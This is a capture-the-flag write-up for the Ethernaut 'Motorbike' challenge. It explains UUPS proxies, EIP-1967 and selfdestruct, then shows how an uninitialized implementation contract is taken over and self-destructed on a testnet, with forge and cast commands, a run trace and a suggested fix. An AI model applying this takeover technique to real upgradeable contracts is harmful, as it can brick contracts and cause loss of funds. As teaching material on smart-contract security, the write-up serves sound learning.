# Motorbike

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable?

[EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)

[UUPS Proxies](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)

[EIP-6780](https://eips.ethereum.org/EIPS/eip-6780)

[Events](https://docs.soliditylang.org/en/latest/contracts.html#events)

## Notes

### Upgradeable Smart Contracts

The concept of upgradeable smart contracts typically involves using a proxy pattern. The proxy pattern separates the contract into two main parts:

1. `Proxy Contract`: This is the contract that users interact with directly. It holds the state (data) and delegates calls to the implementation contract. The address of the implementation contract is stored in the proxy's storage.
2. `Implementation Contract`: This contract contains the logic (code). Users do not interact with it directly. When the logic needs to be updated, a new implementation contract is deployed, and the proxy contract is updated to point to the new implementation.

This pattern allows for the logic of the contracts to be upgraded without losing the existing state or having to migrate to a new contract address.

### UUPS (Universal Upgradeable Proxy Standard)

`UUPS` is a specific implementation of the upgradeable proxy pattern, proposed as an improvement and standardization. It integrates the upgrade mechanism into the implementation contract itself, rather than relying solely on the proxy for upgrades. Key features include:

1. `Self-contained Upgrade Logic`: In UUPS, the implementation contract includes the logic necessary to upgrade itself. This means that the implementation contract can decide whether an upgrade is allowed, potentially introducing more sophisticated governance mechanisms.
2. `Reduced Gas Costs`: Since the upgrade logic is part of the implementation contract, it can be more gas-efficient compared to other proxy patterns, like the Transparent Proxy Pattern, which requires additional storage slots and checks on the proxy side.
3. `EIP-1967 Compliance`: UUPS follows the storage layout and standards proposed in EIP-1967, which standardizes the storage slots used by proxy contracts to store addresses of the implementation contracts and other necessary information. This standardization helps in avoiding storage collisions and makes the contracts safer.

### Key Points of EIP-1967

* Standardized Storage Slots: It specifies certain storage slots in the Ethereum Virtual Machine (EVM) that should be used by proxy contracts for storing addresses of logic contracts (implementation contracts) and other critical information. These slots are chosen to be at locations that are highly unlikely to clash with the storage layout of the implementation contract.

* Security and Upgradeability: By standardizing where proxies store the address of the implementation contract and other essential data, EIP-1967 aims to reduce the risk of storage collisions. This is crucial for upgradeable contracts, where the logic contract can be changed. A standardized approach helps ensure that upgrades can be performed safely and predictably.

* Implementation Contract Address: Specifically, EIP-1967 suggests using a particular storage slot (`0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`, derived from `keccak256('eip1967.proxy.implementation') - 1`) to store the address of the implementation contract. This helps external entities and other contracts to reliably identify the current implementation being used by a proxy.

* Admin Slot: It also defines a standard slot for storing the address of the `admin` or the entity with the authority to upgrade the proxy. This is crucial for managing the upgrade process and ensuring that only authorized users can change the implementation contract.

* Beacon Proxies: EIP-1967 covers not just direct upgradeable proxies but also beacon proxies, where multiple proxy contracts share a single "beacon" that stores the address of the current implementation contract. This allows for more efficient upgrades across many contracts.

### selfdestruct function

How `selfdestruct` works:

1. `Removes Contract Code`: When a contract calls `selfdestruct`, its bytecode (the compiled contract code that exists on the blockchain) is removed from the blockchain state. This means that the contract code is no longer executable, and any attempt to call the contract will fail as if the contract doesn't exist.

2. `Transfers Ether`: The `selfdestruct` function sends all remaining Ether stored in the contract to a specified address. This is the only action that moves Ether out of the contract during the self-destruction process.

3. `State Changes`: The contract's storage (its state) is also cleared from the blockchain. This means that all stored data, variables, and so forth are removed.

Immutability and `selfdestruct`:

* `Blockchain history remains`: While selfdestruct removes the contract's code and state from the current blockchain state, the history of the contract's transactions and the fact that it existed and was self-destructed remain on the blockchain. This means that the action of self-destruction is recorded and immutable, preserving the integrity of the blockchain's history.

* `State changes are immutable`: The blockchain's immutability refers to the fact that once transactions are confirmed, their records cannot be altered or erased. selfdestruct is a part of this immutable record. It's a state change that is permanently recorded on the blockchain.

* `Designed behavior`: The ability to self-destruct a contract is an intentional feature of the Ethereum Virtual Machine (EVM) and Solidity. It's designed to allow developers to remove contracts that are no longer needed or to recover funds. The use of selfdestruct is a controlled and predictable mechanism that fits within the rules of the blockchain's operation.

### initialize function

The `initialize` function plays a crucial role similar to that of a constructor in traditional, non-upgradeable contracts. However, there are key differences due to the nature of proxy contracts and the requirement for upgradeability.

* `Purpose of initialize`: In upgradeable contracts, the constructor cannot be used in the usual way because the contract's bytecode (including the constructor) is only deployed once and is not re-executed during upgrades. Instead, an `initialize` function is used to set up initial state variables and perform any setup logic that a constructor would typically handle.

* `initializer modifier`: This modifier is used with the `initialize` function to ensure that it can only be called once. This is crucial because, without this restriction, anyone could call the `initialize` function again after an upgrade, potentially resetting the contract's state or causing other unintended effects. The `initializer modifier` typically uses a state variable to keep track of whether the function has been called before, blocking any subsequent calls.

How It Works:

* `First Deployment`: When the contract is first deployed, the `initialize` function is called explicitly (it's not called automatically like a constructor). This call sets up initial state variables and performs any necessary initial logic.

* `Upgrade`: When the contract is upgraded to a new version, the new version can also have an `initialize` function for setting up new state variables or adjusting the contract's state according to the upgrade. However, the original initialization logic is protected by the `initializer modifier`, preventing it from being rerun.

* `Protection`: The `initializer modifier` typically checks a boolean flag or uses a more sophisticated mechanism (like `OpenZeppelin's Initializable contract`) to ensure that initialization logic can only be executed once. This mechanism is crucial for maintaining the integrity and security of the contract's state across upgrades.

```bash
import "@openzeppelin/contracts-upgradeable/proxy/Initializable.sol";

contract MyContract is Initializable {
    uint256 public myValue;

    function initialize(uint256 _myValue) public initializer {
        myValue = _myValue;
    }
}
```
### `delegatecall`

When the `proxy` contract calls the `initialize` function of the `implementation` contract using `delegatecall`, it executes the code of the `initialize` function in the context of the `proxy` contract. This means that it's the `proxy` contract's storage that gets updated, not the `implementation` contract's storage. This is crucial for ensuring that the state persists across upgrades.

## Vulnerability

`Engine` is the implementation and `Motorbike` is the proxy contract. There is no `selfdestruct` defined in the contract code, so we need to upgrade the `Engine` contract to point it to an attacker contract.

```bash
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}

function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}

function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
}

function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```

If an attacker finds the address of the `implementation` contract and calls `initialize` directly on it, the function will execute in the context of the `implementation` contract. Since the `implementation` contract's storage is separate and the `initialize` function's protection against multiple calls only applies to the `proxy`'s context, this call would succeed if it hasn't been made before in the implementation's context.

 By calling `initialize` directly on the implementation contract, the attacker can set themselves as the `upgrader` because initialize sets `msg.sender` as the `upgrader`.

 With control over the `upgrader` role, the attacker can then call `upgradeToAndCall` on the proxy contract, pointing it to a malicious implementation contract that includes a `selfdestruct` function. This could lead to loss of funds or destruction of the contract.

### EIP-6780 (after Decun upgrade)

`EIP-6780` proposes a change to the Ethereum protocol regarding the `SELFDESTRUCT` operation. The key idea behind this proposal is to restrict the use of the `SELFDESTRUCT` opcode so that it can only be executed in the same transaction as the contract creation. This means a contract would only be allowed to self-destruct during its creation transaction, significantly altering the current behavior where a contract can call `SELFDESTRUCT` at any point in its lifecycle.

###  Calculating Ethereum contract address

The process of calculating the Ethereum contract address based on the sender's address and the nonce involves a deterministic algorithm defined by Ethereum's protocol. Here's a step-by-step explanation of how it works:

1. `Sender Address`: This is the Ethereum address of the account creating the contract. In Ethereum, addresses are 20 bytes long and typically represented as a 40-character hexadecimal string prefixed with "0x".
2. `Nonce`: The nonce is a counter of the number of transactions sent from the sender's address. For contract creation transactions, the nonce also represents the number of contracts created by the sender before this transaction. It starts from 0 for the first transaction sent from an address.
3. `RLP Encoding`: `Recursive Length Prefix (RLP)` encoding is a serialization method used in Ethereum to encode structured data (like arrays, integers, and byte sequences). The `sender's address` and `nonce` are combined and RLP-encoded. This encoding step structures the data in a way that's ready for hashing.
4. `Keccak-256 Hashing`: The RLP-encoded data is then hashed using the `Keccak-256` hash function. `Keccak-256` is a cryptographic hash function chosen for Ethereum's hashing needs, producing a 32-byte hash.
5. `Extracting the Contract Address`: The Ethereum contract address is determined by taking the rightmost `160 bits (20 bytes)` of the `Keccak-256` hash. This step effectively truncates the 32-byte hash to the size of an Ethereum address. The resulting 20 bytes represent the address of the contract that will be created by the transaction.

## Attack

[MotorbikeFactory.sol](https://github.com/OpenZeppelin/ethernaut/blob/c8ad2e45f6ce11d2d66fb699f07ffee1ab275577/contracts/src/levels/MotorbikeFactory.sol)

1. Deploy `MotorbikeSelfdestruct`.

```bash
forge create MotorbikeSelfdestruct --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --legacy

# MotorbikeAttack contract (0x37260b352DaD12a21AaAa4f023b29D80896648ac)
# https://sepolia.etherscan.io/address/0x37260b352DaD12a21AaAa4f023b29D80896648ac

✗ python src/getContractAddressAndNonce.py
# Nonce for 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6: 3157
# Calculated Contract Address: 0x11cFA1CdFe3414f08cd4aFbf77D5E80Edc282ebd
# Calculated Contract Address nonce+1: 0x76E61f41AC8504B79688221268F757bDf718BCed
```

2. Execute `DeployMotorbikeAttack` script to create the contract and execute the attack() function.
```bash
forge script script/DeployMotorbikeAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast -vvvv --legacy

# make deploy ARGS="--network sepolia"
# https://sepolia.etherscan.io/address/0xF213335be754a4Ae580AFf725539549f0654091E
```

```bash
Traces:
  [1186145] DeployMotorbikeAttack::run()
    ├─ [0] VM::startBroadcast()
    │   └─ ← [Return] 
    ├─ [1145115] → new MotorbikeAttack@0xF213335be754a4Ae580AFf725539549f0654091E
    │   ├─ [681715] Ethernaut::createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)
    │   │   ├─ [458264] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6::createInstance(MotorbikeAttack: [0xF213335be754a4Ae580AFf725539549f0654091E])
    │   │   │   ├─ [264506] → new Engine@0x11cFA1CdFe3414f08cd4aFbf77D5E80Edc282ebd
    │   │   │   │   └─ ← [Return] 1321 bytes of code
    │   │   │   ├─ [102814] → new Motorbike@0x76E61f41AC8504B79688221268F757bDf718BCed
    │   │   │   │   ├─ [45370] Engine::initialize() [delegatecall]
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 172 bytes of code
    │   │   │   ├─ [732] Motorbike::upgrader()
    │   │   │   │   ├─ [392] Engine::upgrader() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
    │   │   │   │   └─ ← [Return] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
    │   │   │   ├─ [638] Motorbike::horsePower()
    │   │   │   │   ├─ [298] Engine::horsePower() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000
    │   │   │   │   └─ ← [Return] 1000
    │   │   │   └─ ← [Return] 0x00000000000000000000000076e61f41ac8504b79688221268f757bdf718bced
    │   │   ├─ [166515] 0x57d122d0355973dA78acF5138aE664548bB2CA2b::createNewInstance(Motorbike: [0x76E61f41AC8504B79688221268F757bDf718BCed], 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, MotorbikeAttack: [0xF213335be754a4Ae580AFf725539549f0654091E])
    │   │   │   ├─ [159212] Statistics::createNewInstance(Motorbike: [0x76E61f41AC8504B79688221268F757bDf718BCed], 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, MotorbikeAttack: [0xF213335be754a4Ae580AFf725539549f0654091E]) [delegatecall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] 
    │   │   ├─ emit LevelInstanceCreatedLog(player: MotorbikeAttack: [0xF213335be754a4Ae580AFf725539549f0654091E], instance: Motorbike: [0x76E61f41AC8504B79688221268F757bDf718BCed], level: 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)
    │   │   └─ ← [Stop] 
    │   ├─ [45484] Engine::initialize()
    │   │   └─ ← [Stop] 
    │   ├─ [33717] Engine::upgradeToAndCall(0x37260b352DaD12a21AaAa4f023b29D80896648ac, 0x2b68b9c6)
    │   │   ├─ [7716] Engine::destruct() [delegatecall]
    │   │   │   └─ ← [SelfDestruct] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 1453 bytes of code
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop] 
```

3. Submit instance

```bash
cast send $CONTRACT_ADDRESS "submitLevelInstance()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/tx/0xbcd5dcd483477bc1c7bfd0ba0d12a4ba6a5e8e71a6a4385fb69a2dbff0955d90
```

## Fix

- Use of initializer Modifier: Ensure that the initialize function is protected with an initializer modifier or similar logic that prevents it from being called more than once across all contexts.

```bash
contract Upgradeable {
    bool private initialized;

    // Modifier to protect an initialize function from being called more than once
    modifier initializer() {
        require(!initialized, "Contract instance has already been initialized");
        _;
        initialized = true;
    }

    // Example state variable
    uint256 public value;

    // The initialize function replaces the constructor for upgradeable contracts
    // It can be called only once thanks to the initializer modifier
    function initialize(uint256 _value) public initializer {
        value = _value;
    }
}
```

- Access Control: Implement robust access control mechanisms to restrict who can call sensitive functions like upgradeToAndCall.
